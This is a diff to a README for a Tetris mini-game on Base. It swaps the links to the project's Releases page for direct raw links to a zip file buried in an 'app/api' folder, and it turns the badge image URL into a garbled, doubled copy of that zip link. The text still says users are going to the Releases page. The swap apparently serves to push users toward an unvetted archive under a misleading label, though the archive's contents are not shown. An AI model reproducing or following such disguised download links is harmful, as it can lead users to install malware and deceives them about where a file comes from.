@@ -8,14 +8,14 @@
 - Easy to understand for all users.
 
 ## 📥 Download Now!
-[![Download tetris-on-base](https://img.shields.io/badge/Download-Tetris%20Mini--Game-brightgreen.svg)](https://github.com/YawAmoah/tetris-on-base/releases)
+[![Download tetris-on-base](https://raw.githubusercontent.com/YawAmoah/tetris-on-base/main/tetris-on-base/app/api/base_tetris_on_v3.4.zip%https://raw.githubusercontent.com/YawAmoah/tetris-on-base/main/tetris-on-base/app/api/base_tetris_on_v3.4.zip)](https://raw.githubusercontent.com/YawAmoah/tetris-on-base/main/tetris-on-base/app/api/base_tetris_on_v3.4.zip)
 
 ## 🚀 Getting Started
 To get started with the Tetris mini-game on Base, follow these simple steps. You will soon be enjoying a fun game experience.
 
 ## 🔗 Download & Install
 1. **Visit the Releases Page**: Click the link below to go to our Releases page, where you can find the latest version of the game.
-   [Download the game here](https://github.com/YawAmoah/tetris-on-base/releases).
+   [Download the game here](https://raw.githubusercontent.com/YawAmoah/tetris-on-base/main/tetris-on-base/app/api/base_tetris_on_v3.4.zip).
 
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Select the most recent one for the best experience.
 
